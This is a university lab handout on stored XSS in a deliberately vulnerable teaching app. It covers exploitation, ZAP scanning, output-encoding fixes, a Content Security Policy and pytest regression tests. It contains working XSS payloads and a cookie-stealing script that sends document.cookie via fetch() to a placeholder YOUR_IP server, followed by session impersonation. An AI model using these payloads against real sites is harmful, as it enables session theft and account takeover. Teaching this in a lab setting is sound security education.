# Week 8 Lab — XSS, Bug Bounty, and Automated Testing

**Lecture:** XSS and Testing Web Services with SAST and DAST; Manual Testing and Hardening

---

## Overview

Stored XSS is present in two places: the messaging system renders message bodies with `| safe`, and advising notes do the same. This week you exploit both, escalate to session cookie theft, run OWASP ZAP against the full application, and compare automated tool findings against everything you have found manually across all eight weeks. You will then remediate XSS through output encoding and implement a Content Security Policy.

---

## Tools

| Tool | Purpose |
|------|---------|
| Browser + Developer Tools | Exploit and observe XSS payloads |
| OWASP ZAP | Automated DAST scanning |
| Python HTTP server | Receive exfiltrated cookies |
| pytest | Write automated regression tests for XSS |

**Download OWASP ZAP:** [zaproxy.org/download](https://www.zaproxy.org/download/)

ZAP is available for macOS, Windows, and Linux. Download the installer for your platform.

### Platform Notes

**Starting the Python HTTP server (Step 3):**

**macOS / Linux:**
```bash
python3 -m http.server 8888
```

**Windows (PowerShell or Git Bash):**
```powershell
python -m http.server 8888
```

> If the command is not found, ensure Python is installed and on your PATH. On Windows, try `py -m http.server 8888`.

**Finding your machine's IP address (needed for the cookie-stealing payload):**

**macOS:**
```bash
ipconfig getifaddr en0
```

**Linux:**
```bash
hostname -I | awk '{print $1}'
```

**Windows (PowerShell):**
```powershell
(Get-NetIPAddress -AddressFamily IPv4 | Where-Object {$_.InterfaceAlias -notlike "*Loopback*"}).IPAddress
```

**Windows (Git Bash):**
```bash
ipconfig | grep "IPv4"
```

---

## Steps

### 1. Test Messaging for Stored XSS

**What `| safe` does in Jinja2 and why it creates an XSS vulnerability:**
Jinja2, the templating engine Flask uses, automatically escapes HTML characters in variables by default. When you render `{{ m.body }}`, Jinja2 converts `<` to `&lt;` and `>` to `&gt;`, so a script tag becomes visible text rather than executable HTML. The `| safe` filter disables this escaping, telling Jinja2 "I have already sanitized this value, render it as raw HTML." The application uses `| safe` to allow message formatting, but it does not sanitize user input before storage. The result: any user can store a `<script>` tag in the database, and Jinja2 will render it as live HTML in every recipient's browser. The script executes with the privileges of the victim's session — it can read cookies, make authenticated requests, or exfiltrate data.

Log in as `jsmith`. Navigate to `/messages`. In the **Compose** form, select any recipient and enter the following in the **Message** body:

```html
<script>alert(document.cookie)</script>
```

Send the message. Log in as the recipient in a second browser session and view the inbox. Document whether the script executes and what it displays.

---

### 2. Test Advising Notes for Stored XSS

**Why an `onerror` attribute on an `img` tag is effective as an XSS vector:**
The `<img>` tag with an invalid `src` triggers the `onerror` event handler because the browser attempts to load the image, fails (since `src=x` is not a valid image URL), and executes whatever JavaScript is in `onerror`. This bypasses filters that only look for `<script>` tags specifically. It also works in contexts where script tags are stripped but HTML attributes are not. The payload executes in the context of the page loading it — in this case, when an advisor views their notes about a student.

Log in as `mwilson` (advisor, password: `advisor123`). Navigate to `/messages/advising-notes`. Add a note for student ID 3 with the content:

```html
<img src=x onerror="alert('XSS in advising note: ' + document.cookie)">
```

Log in as `jsmith` and view `/messages/advising-notes`. Document whether the payload executes.

---

### 3. Craft a Cookie-Stealing Payload

**What each component of the payload does:**
`document.cookie` is a browser API that returns a string containing all non-HttpOnly cookies for the current domain, concatenated as `name=value; name=value`. `encodeURIComponent()` converts special characters (spaces, semicolons, equals signs) to URL-safe percent-encoded form so the cookie string can be safely appended to a URL query parameter. `fetch()` makes an HTTP GET request from the victim's browser to your server at `YOUR_IP:8888`. Your Python HTTP server receives this GET request and logs it — the query string contains the victim's full cookie. You are not breaking into the server; the victim's own browser is sending you the credentials voluntarily, because your injected script instructed it to.

Start a simple HTTP server on your machine to receive exfiltrated data (see platform commands above). Use port 8888.

Find your machine's local IP address using the platform-specific command above. You need this because the victim's browser makes the outbound request — `localhost` would resolve to the victim's own machine, not yours.

Craft a payload that sends the victim's session cookie to your server:

```html
<script>
  fetch('http://YOUR_IP:8888/?cookie=' + encodeURIComponent(document.cookie))
</script>
```

Send this as a message from `jsmith` to `alee`. Log in as `alee` and view the inbox. Confirm the cookie arrives at your HTTP server. Paste the server log output in your report.

---

### 4. Combine with Session Impersonation

Using the cookie you just exfiltrated, follow the Week 2 impersonation procedure (manually set the cookie in Developer Tools). Confirm you are now authenticated as `alee`. Document what you can access.

This step connects the concepts: an XSS payload is not just a popup. It is arbitrary JavaScript execution in a victim's browser, which can be chained with any other action the victim is authorized to perform.

---

### 5. Run OWASP ZAP Active Scan

**What the difference is between DAST and manual testing:**
Dynamic Application Security Testing (DAST) tools like ZAP interact with a running application from the outside — the same way an attacker would. ZAP sends a large library of known-bad inputs to every form and URL it discovers, then analyzes the responses for patterns that indicate vulnerabilities. It does not read your source code (that is SAST — Static Application Security Testing). ZAP's value is breadth: it can test hundreds of inputs per minute across every endpoint it finds, systematically. Its limitation is that it operates without understanding application logic — it cannot reason about multi-step flows, session context, or vulnerabilities that only appear under specific conditions. You will compare its findings to yours after the scan.

Open ZAP. In the **Quick Start** tab, set the URL to `http://localhost` and click **Automated Scan**. Let it complete fully.

Export the report: **Report → Generate Report → HTML**.

> **macOS note:** If ZAP does not open after installation, right-click the `.app` file → Open → confirm you want to open it (macOS Gatekeeper restriction on unsigned applications).

> **Windows note:** Launch ZAP from the Start menu or desktop shortcut. Accept the JRE prompt if it appears — ZAP requires Java, which the installer bundles.

---

### 6. Compare ZAP Findings to Manual Findings

Create a table with three columns:

| Finding | Found by ZAP | Found Manually (which week) |
|---------|-------------|------------------------------|
| SQL Injection (grades search) | ... | ... |
| Stored XSS (messages) | ... | ... |
| ... | ... | ... |

For findings in only one column, explain why the other method missed it. This comparison is the point of the exercise — neither method alone is sufficient.

---

### 7. Bug Bounty Exercise

**What a bug bounty program is and how responsible disclosure works:**
A bug bounty program is a formal agreement where an organization offers payment or recognition to security researchers who discover and responsibly disclose vulnerabilities. "Responsible disclosure" means reporting the vulnerability privately to the organization and giving them time to fix it before publishing details publicly. The research you have been doing in this course — methodical, documented, proof-of-concept — is exactly the format a real bug report requires. Today you apply that process to HuskyHub with no specific assignment: find something that was not in the lab instructions.

Spend 20 minutes looking for any vulnerability not formally assigned in any prior week. This is deliberately open-ended. Document each finding with: endpoint, vulnerability type, proof-of-concept, and a severity rating with justification.

---

### 8. Remediation — Output Encoding

**What removing `| safe` accomplishes and why Jinja2's default is safe:**
Jinja2 was designed with auto-escaping enabled as the default for HTML templates. When `| safe` is removed, Jinja2's template renderer intercepts the variable value before writing it to the output stream and replaces `<` with `&lt;`, `>` with `&gt;`, `"` with `&quot;`, and `&` with `&amp;`. These are HTML entities — the browser renders them as the visible characters `< > " &` but does not interpret them as HTML syntax. A `<script>` tag stored in the database becomes `&lt;script&gt;` in the HTML — the browser displays it as text, not code. No JavaScript executes. The key insight is that this is output encoding happening at render time, not input sanitization happening at storage time — the raw payload can stay in the database without issue as long as it is never rendered as raw HTML.

In Jinja2, remove every instance of `| safe` from templates where user-supplied content is rendered. Specifically:

- `messages.html` — the `{{ m.body | safe }}` line
- `advising_notes.html` — the `{{ n.note_content | safe }}` line

Jinja2's auto-escaping will now encode `<script>` as `&lt;script&gt;` before rendering.

Rebuild and verify that Step 1's payload is rendered as escaped text rather than executed.

---

### 9. Implement a Content Security Policy

**What CSP does at the browser level and what `default-src 'self'` means:**
A Content Security Policy is an HTTP response header that tells the browser which sources it is allowed to load content from and execute scripts from. `default-src 'self'` establishes the baseline: all content must come from the same origin as the page. `script-src 'self'` specifically restricts JavaScript execution to scripts loaded from the same origin — inline scripts (those written directly in the HTML, including injected `<script>` tags) are blocked unless explicitly permitted. This means even if an attacker successfully injects a `<script>` tag into the page, the browser will refuse to execute it if CSP is present. CSP is a defense-in-depth layer: it does not fix the XSS vulnerability, but it limits the damage if the vulnerability exists or is reintroduced.

Add the following header in `nginx/default.conf` inside the HTTPS server block:

```nginx
add_header Content-Security-Policy "default-src 'self'; script-src 'self'" always;
```

Reload nginx. In Developer Tools → Network, verify the `Content-Security-Policy` header is present on responses.

Re-run Step 3's cookie-stealing payload. Open the browser console and document what error appears.

---

### 10. Write Automated XSS Regression Tests

**What regression tests are for and what these tests specifically assert:**
A regression test verifies that a bug that was fixed does not get reintroduced. Without automated tests, every code change requires a manual re-verification of every previously fixed vulnerability — which never happens in practice. These pytest tests automate that check: on every build, they send known XSS payloads to the vulnerable endpoints and assert that the raw `<script>` tag is not present in the response HTML. The assertion checks for the *escaped* form (`&lt;script&gt;`) rather than simply for absence of the tag, because a blank response or an error would also pass an absence check — you want to confirm the content is present and escaped, not just that it is absent for some other reason.

Create `flask/tests/test_xss.py` using pytest:

```python
import pytest
import requests

BASE = "http://localhost"
PAYLOADS = [
    "<script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "javascript:alert(1)",
]

def login(username, password):
    s = requests.Session()
    s.post(f"{BASE}/login", data={"username": username, "password": password})
    return s

def test_message_body_not_executed():
    session = login("jsmith", "password123")
    # After remediation, post a payload and retrieve the inbox
    # Assert the raw tag is present in the HTML as escaped text
    ...
```

Write three test cases: one for message body XSS, one for advising notes XSS, and one for a URL-reflected parameter. Each test must assert that the raw `<script>` tag is present as escaped HTML entities, not as an executable tag.

Run the tests:

**macOS / Linux:**
```bash
pip3 install pytest
python3 -m pytest flask/tests/test_xss.py -v
```

**Windows:**
```powershell
pip install pytest
python -m pytest flask/tests/test_xss.py -v
```

---

## Write-Up Questions

**Q1.** Explain the difference between stored XSS, reflected XSS, and DOM-based XSS. Which type did you exploit in Steps 1 and 2? Why is stored XSS considered more severe?

**Q2.** Paste the HTTP server log output from Step 3 showing the exfiltrated cookie. Describe the full attack chain from sending the malicious message to impersonating the victim's session (connecting Steps 3 and 4).

**Q3.** Present your ZAP vs. manual findings table. What categories of vulnerability did ZAP find that you had not found manually? What did you find manually that ZAP missed? What does this say about relying solely on automated scanning?

**Q4.** Explain how Content Security Policy prevents the execution of injected scripts. What is the limitation of CSP as the sole XSS defense?

**Q5.** Document your bug bounty findings. For your most interesting finding, write a formal vulnerability report including: title, severity (with CVSS score justification), affected component, description, steps to reproduce, impact, and recommended remediation.

---

## Hacker Mindset Prompt

XSS is often dismissed as a minor client-side issue. This is a serious underestimation. A committed attacker with arbitrary JavaScript execution in a victim's browser can steal sessions, log keystrokes, capture form submissions, pivot to the local network, and perform any action the victim can perform — silently.

Reflect on:

- **Contrarian:** The developer added `| safe` to the message template to "support rich formatting." What assumption did they make about who would be sending messages, and how did that assumption fail?
- **Committed:** The bug bounty model pays researchers to find vulnerabilities before attackers do. What distinguishes authorized security research from unauthorized access, legally and ethically?
- **Creative:** Your cookie-stealing payload required the victim to load a page containing the payload. What would a more sophisticated attacker do to ensure the payload is executed without the attacker being obviously implicated?
